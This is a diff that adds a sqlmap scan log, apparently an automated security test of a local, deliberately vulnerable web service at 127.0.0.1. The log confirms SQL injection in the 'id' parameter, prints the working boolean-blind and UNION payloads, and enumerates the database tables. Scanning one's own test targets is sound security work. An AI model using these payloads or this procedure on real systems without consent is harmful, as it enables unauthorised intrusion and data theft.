@@ -1,0 +1,69 @@
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.8.4#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:26:07 /2026-11-07/
+
+[19:26:07] [WARNING] using '/opt/ares/security_reports/test-vuln-node_20261107T182417Z/sqlmap' as the output directory
+[1/1] URL:
+GET http://127.0.0.1:8097/item?id=1
+do you want to test this URL? [Y/n/q]
+> Y
+[19:26:07] [INFO] testing URL 'http://127.0.0.1:8097/item?id=1'
+[19:26:07] [INFO] using '/opt/ares/security_reports/test-vuln-node_20261107T182417Z/sqlmap/results-11072026_0726pm.csv' as the CSV results file in multiple targets mode
+[19:26:07] [INFO] testing connection to the target URL
+[19:26:08] [INFO] checking if the target is protected by some kind of WAF/IPS
+[19:26:08] [INFO] testing if the target URL content is stable
+[19:26:08] [INFO] target URL content is stable
+[19:26:08] [INFO] testing if GET parameter 'id' is dynamic
+[19:26:08] [INFO] GET parameter 'id' appears to be dynamic
+[19:26:08] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[19:26:08] [INFO] testing for SQL injection on GET parameter 'id'
+[19:26:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:26:09] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[19:26:09] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (3) and risk (2) values? [Y/n] Y
+[19:26:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[19:26:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[19:26:09] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[19:26:09] [INFO] target URL appears to have 3 columns in query
+[19:26:09] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[19:26:09] [WARNING] applying generic concatenation (CONCAT)
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2725=2725
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,CHAR(113,107,118,106,113)||CHAR(74,117,121,101,84,98,74,119,103,65,103,76,75,81,78,73,99,118,111,103,66,103,122,78,85,87,71,68,114,79,88,85,120,112,72,105,72,111,97,76)||CHAR(113,112,122,120,113),NULL-- wGpb
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[19:26:09] [INFO] testing SQLite
+[19:26:09] [INFO] confirming SQLite
+[19:26:09] [INFO] actively fingerprinting SQLite
+[19:26:09] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[19:26:09] [INFO] fetching tables for database: 'SQLite_masterdb'
+<current>
+[1 table]
++-------+
+| items |
++-------+
+
+[19:26:09] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 38 times
+[19:26:09] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/opt/ares/security_reports/test-vuln-node_20261107T182417Z/sqlmap/results-11072026_0726pm.csv'
+[19:26:09] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 19:26:09 /2026-11-07/
+
